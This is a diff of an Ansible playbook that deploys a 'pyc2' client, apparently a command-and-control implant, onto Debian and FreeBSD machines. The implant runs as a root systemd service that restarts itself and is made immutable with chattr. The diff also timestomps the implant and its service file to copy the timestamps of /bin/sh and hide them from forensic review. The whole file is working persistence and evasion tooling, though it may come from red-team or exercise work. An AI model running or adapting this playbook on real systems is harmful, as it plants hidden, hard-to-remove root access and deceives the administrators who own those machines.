@@ -1,4 +1,8 @@
 ---
+- name: Get reference file stats (Common for Unix/BSD)
+  ansible.builtin.stat:
+    path: "{{ pyc2_timestomp_ref_unix }}"
+  register: unix_ref
 
 #- name: Install Python 3 and pip3 on Debian/Ubuntu
 #  ansible.builtin.package:
@@ -123,6 +127,20 @@
     backup: yes
   when: ansible_os_family == 'FreeBSD'
 
+- name: Install venv support for Debian
+  ansible.builtin.package:
+    name: python3-venv
+  when: ansible_os_family == "Debian"
+
+- name: Create venv and install requirements
+  ansible.builtin.pip:
+    requirements: "{{ [pyc2_client_location_unix | dirname, 'requirements.txt'] | path_join }}"
+    virtualenv: "{{ [pyc2_client_location_unix | dirname, 'venv'] | path_join }}"
+    virtualenv_command: "{{ (ansible_os_family == 'Windows') | ternary('python -m venv', 'python3 -m venv') }}"
+    state: present
+  vars:
+    base_dir: "{{ (ansible_facts.os_family == 'Windows') | ternary('python -m venv --with-pip', 'python3 -m venv --with-pip') }}"
+
 - name: Create systemd service to execute script
   copy:
     dest: "/etc/systemd/system/{{ pyc2_service_name }}.service"
@@ -132,7 +150,7 @@
       After=network.target
 
       [Service]
-      ExecStart=/usr/bin/python3 {{ pyc2_client_location_unix }}
+      ExecStart={{ [pyc2_client_location_unix, 'venv//bin/python3'] | path_join }} {{ pyc2_client_location_unix }}
       Restart=always
       RestartSec=60
       User=root
@@ -208,16 +226,26 @@
 #    state: started
 #  when: ansible_os_family == 'FreeBSD'
 
-- name: Timestomp the systemd service file debian
-  command: touch -r /bin/sh /etc/systemd/system/{{ pyc2_service_name }}.service
-  when: ansible_os_family == 'Debian'
+#- name: Timestomp the systemd service file debian
+#  command: touch -r /bin/sh /etc/systemd/system/{{ pyc2_service_name }}.service
+#  when: ansible_os_family == 'Debian'
+#
+#- name: Timestomp the systemd service file freebsd
+#  command: touch -r /bin/sh /usr/local/etc/rc.d/{{ pyc2_service_name }}
+#  when: ansible_os_family == 'FreeBSD'
+#
+#- name: Timestomp script to match /bin/sh creation time
+#  command: touch -r /bin/sh {{ pyc2_client_location_unix }}
 
-- name: Timestomp the systemd service file freebsd
-  command: touch -r /bin/sh /usr/local/etc/rc.d/{{ pyc2_service_name }}
-  when: ansible_os_family == 'FreeBSD'
-
-- name: Timestomp script to match /bin/sh creation time
-  command: touch -r /bin/sh {{ pyc2_client_location_unix }}
+- name: Apply Timestomp to all deployed files
+  ansible.builtin.file:
+    path: "{{ item }}"
+    state: file
+    modification_time: "{{ unix_ref.stat.mtime | string | split('.') | first }}"
+    access_time: "{{ unix_ref.stat.atime | string | split('.') | first }}"
+  loop:
+    - "{{ pyc2_client_location_unix }}"
+    - "{{ (ansible_os_family == 'Debian') | ternary('/etc/systemd/system/' + pyc2_service_name + '.service', '/usr/local/etc/rc.d/' + pyc2_service_name) }}"
 
 - name: Set immutable attribute on script
   command: "chattr +i {{ pyc2_client_location_unix }}"
